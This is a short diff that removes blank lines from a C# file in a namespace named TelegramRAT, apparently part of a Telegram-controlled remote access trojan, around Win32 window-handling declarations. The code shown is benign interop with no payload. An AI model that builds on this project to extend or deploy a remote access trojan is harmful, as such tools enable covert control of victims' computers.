@@ -139,7 +139,6 @@ namespace TelegramRAT
         [DllImport(u32, EntryPoint = "GetWindowRect")]
         static extern unsafe bool GetWindowRect(IntPtr hWnd, Rectangle* Rect);
 
-
         public static unsafe Rectangle GetWindowBounds(IntPtr hWnd)
         {
             Rectangle rect = new Rectangle();
@@ -156,8 +155,6 @@ namespace TelegramRAT
 
         [DllImport(u32, EntryPoint = "IsWindow")]
         public static extern bool IsWindow(IntPtr hWnd);
-
-
 
     }
 }
